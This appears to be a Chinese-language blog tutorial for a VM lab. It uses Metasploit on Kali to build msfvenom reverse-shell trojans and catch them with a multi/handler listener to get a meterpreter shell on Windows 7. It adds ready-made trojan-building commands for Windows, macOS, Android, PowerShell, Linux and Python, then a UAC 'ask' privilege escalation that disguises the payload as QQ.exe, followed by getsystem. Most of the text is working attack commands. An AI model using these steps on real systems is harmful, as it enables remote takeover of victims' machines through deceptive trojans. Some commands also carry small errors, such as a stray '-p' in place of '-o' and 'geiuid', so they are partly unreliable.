网络安全--msf攻击框架&&UAC提权
2022-12-16 23:22:13

实验目的：通过Kali的msf框架生成木马，在win7中打开从而中招，攻击成功后拿到win7的shell在桌面创建文件。

实验需要：VMware上建立两个虚拟机：kali和win7

实验条件：win7中，关闭防火墙（“打开网络和共享中心”-“Windows防火墙”-“打开或关闭Windows防火墙”-均选择关闭选项）

保证在一个内网，即Kali是可以ping通win7的。

查看两台机器的ip确保是可以ping通的。

被攻击机：win7 x64位 win+r 打开cmd用ipconfig查看ip（192.168.249.133）

攻击机：Kali 64位 ifconfig查看ip（192.168.249.134）


在Kali中打开Metasploit渗透工具

kali中通过msfvenom生成.exe的木马文件

生成32位系统的木马

msfvenom -a x86 -platform windows -p windows/meterpreter/reverse_tcp lhost=[自己ip] lport=4444 -f exe > msf.exe


(-platform指平台，-p指攻击载荷payload（默认是windows/meterpreter/reverse_tcp，lhost是自己的ip，lport指使用的端口，默认也是4444端口，-f是行为是exe文件，>后面跟的是你要生成文件的名字)


可以先cd进入桌面，这样生成木马文件比较直观。(下图的msf.exe)

然后将该木马通过本机再拖到win7里面（需要Vmwatools->可以实现拖动文件达到主机与虚拟机的文件移动 注：需要关闭杀毒软件）

拖至win7中效果如下：

在Kali中通过 msfconsole 打开msf


这里我们需要知道一点：

msf如果使用漏洞去攻击对方，需要的条件：

1.漏洞

2.攻击载荷（木马，病毒）


msfconsole

成功进入，进入到"msf6>“的模式下


在msf里建立木马的控制端

use exploit/multi/handler

set payload windows/meterpreter/reverse_tcp

#如果生成64位木马 set payload windows/x64/meterpreter/reverse_tcp

show options 查看选项

其中，requierd被打上yes的必填，no的是可不填。


set lhost [自己的ip] 我的是set lhost 192.168.249.134

set lport 4444

检查一遍没有问题ok，直接exploit开始攻击，（run也可以）


exploit 进入监听状态

此时如果木马启动，就会连接我

进入win7双击运行刚刚生成的msf.exe木马。


在进入Kali

拿到meterpreter攻击成功！

可以用help查看选项


有很多，我们这里用到的是shell

拿到cmd，此时就在桌面界面

创建一个文件夹试试

mkdir 123

成功！

补充：

其他木马的命令：

生成64位木马

msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=[自己ip] lport=4444 -f exe -o msf.exe

生成mac（旧版本苹果电脑）木马

msfvenom -a x86 --platform osx -p osx/x86/shell_reverse_tcp lhost=[自己ip] lport=4444 -f macho -p msf.macho


生成android（旧版本安卓，需要数字签名）木马

msfvenom -a x86 --platform Android -p android/meterpreter/reverse_tcp lhost=[自己ip] lport=4444 -f apk -o msf.apk


生成powershell木马

msfvenom -a x86 --platform windows -p windows/powershell_reverse_tcp lhost=[自己ip] lport=4444 -e cmd/powershell_base64 -i 3 -f raw -o msf.ps1


生成linux木马

msfvenom -a x86 --platform Linux -p linux/x86/meterpreter/reverse_tcp lhost=[自己ip] lport=4444 -f elf -o msf.elf


生成python木马

msfvenom -p python/meterpreter/reverse_tcp lhost=[自己ip] lport=4444 -f raw -o msf.py

UAC提权


实验目的：攻击成功后，想要通过kali在win8中建立一个文件，后发现权限不够的问题，则进行提权操作，之后文件创建成功。

实验需要：VMware上建立两个虚拟机：kali和win8(我的是64位)

被攻击机：win7 x64位 win+r 打开cmd用ipconfig查看ip（192.168.249.133）

攻击机：Kali 64位 ifconfig查看ip（192.168.249.134）

通过geiuid可以查看你的用户权限(因为我的win7被改造过了能够直接提权到System权限)

补充：

windows系统中用户权限：

user-普通用户；

administrator-管理员用户；

system-系统用户、虽不可登录，最高权限，但对系统有完整的控制权；

Linux系统中用户权限：

user-普通用户；

root-最高权限用户；

geiuid后此时如果不是Administrator用户，

考虑使用ask模块提权

background 把木马放到后台

use exploit/windows/local/ask加载ask模块

info 查看漏洞信息

set session [编号] 把漏洞用在几号木马控制的目标上

set filename QQ.exe 伪装成qq程序

exploit

会在用户桌面弹出一个是否允许qq启动，用户选择yes，成功！(我这边没有弹，有兴趣的可以重装一个崭新出厂的win7试一试)

background放入后台


然后会反弹给我一个新的session（用sessions查看）

sessions -i 5

进入这个新的session

getuid 发现还不是system

getsystem 提高到system权限

成功！
